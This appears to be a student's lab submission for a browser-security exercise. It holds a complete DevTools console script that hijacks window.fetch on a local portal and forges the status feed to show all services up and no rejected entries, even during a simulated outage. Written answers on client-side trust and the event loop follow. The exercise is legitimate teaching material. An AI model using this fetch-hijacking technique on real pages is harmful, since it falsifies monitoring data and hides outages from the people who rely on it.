# Mission 3: Console attack, forge the status feed

## Before: an honest Refresh

Real feed, some services not up, 7 rejected:

![honest feed](<img/img1 m3.png>)

## After: my cover-up

Every service UP / ONLINE, 0 rejected:

![forged feed](<img/img2 m3.png>)

Portal still shows everything up during a simulated HTTP 503 outage:

![green during outage](<img/img3 m3.png>)

## My attack script

Paste the full contents of `attacks/m3_coverup.js`:

```js
// =====================================================================
// MISSION 3 ATTACK: Cover up the outage
// =====================================================================
// Write your attack here, then COPY the whole file and PASTE it into the
// DevTools Console of http://localhost:3000. Then click Refresh.
//
// Start from the worked example in examples/m3_case_fetch_spy.js.
//
// Author:
// =====================================================================

(() => {
  const realFetch = window.fetch;

  // TODO R1: replace window.fetch; requests that are not /api/status must pass through untouched.
  let lastForgedReport = null;

  window.fetch = async (input, init) => {
    if (!String(input).includes("/api/status")) {
      return realFetch(input, init);
    }

// TODO R2: for /api/status, read the real JSON and forge a report where every service is "up" and online.
    try {
     console.log("[attack] before await realFetch"); 
      const res = await realFetch(input, init);
        console.log("[attack] after await realFetch");


      if (!res.ok) {
        throw new Error("status request failed");
      }

      const data = await res.json();

      const services = data.services
  .filter(service =>
    service !== null &&
    typeof service === "object" &&
    typeof service.name === "string" &&
    service.name.trim().length > 0 &&
    service.name.trim().length <= 64
  )
  .map(service => ({
    name: service.name.trim(),
    status: "up",
    online: true,
    latencyMs: 0
  }));

// TODO R3: the forged report must PASS the portal's validation, so "Rejected entries" shows 0.
      lastForgedReport = {
        services: services
      };

      return new Response(JSON.stringify(lastForgedReport), {
        status: 200,
        headers: { "Content-Type": "application/json" }
      });

// TODO R4: during an outage or a broken proxy, keep showing the last forged "all up" report.
    } catch (error) {
      if (lastForgedReport !== null) {
        return new Response(JSON.stringify(lastForgedReport), {
          status: 200,
          headers: { "Content-Type": "application/json" }
        });
      }

      throw error;
    }
  };

  // TODO R5: expose window.__restoreFetch() that puts the real fetch back.
  window.__restoreFetch = () => {
    window.fetch = realFetch;
  };

  console.log("[attack] cover-up installed");
})();

``` 

## Questions

1. Can `window.fetch` be replaced by code running in the page? How did you confirm it, and why does that break every client-side security assumption?

   > Yes, I confirmed this by saving the real fetch function and then replacing window.fetch with my own async function After I installed it, clicking Refresh used my reolacmnet and showed my forged data instead of the real status data. THis breaks client-side secuirty assumptions cause code rinning in the page can chnage browser functions that the page trusts. 

2. The real feed contains a `null` entry and other junk. What did your `map` do so it would not crash on those, and still produce a report that passes the portal's validator?

   > I used filter() before map() to remove entries that were null, not objects or did not have a vlid name. Then map() created a new object with only the fields the validator expects: a valid name, "up" status, true for nline, and 0 for latency. This kept the junk from crashing the code and made the forged report pass validation with 0 rejected entries. 

3. The portal used `textContent` and validated its data, yet you still fooled it. Name the single assumption the portal made that was false.

   > that the data returned by fetch could be trustd. Even tho the portal validated the data and safely displayd it, attacker code running in te page was able to replace fetch and chnage the data before the portal recived it. 

## Async order: predict, then verify

**My prediction, written before running anything:**

> Does `await realFetch(...)` finish before or after `loadStatus` hands control back to the click handler? My guess: loadStatus hands control back to the click handler while its waiting for await realFetch(...). 

**What the console actually showed:**

```
[attack] cover-up installed
[attack] before await realFetch
[attack] after await realFetch
```

**Explanation, using single-threaded, non-blocking, and event loop:**

> JavaScript is single-threaded, but asynchronous operations like `fetch` are non-blocking. When my code reached `await realFetch(...)`, it waited for the network request without blocking the whole page. Once the request finished, the event loop allowed the rest of the async function to continue, which is when the "after await realFetch" message appeared. 

## Stretch goal, optional

> Leave empty if not attempted.

## Documentation log

| Page I used, with URL | One thing I learned from it |
|---|---|
| | |
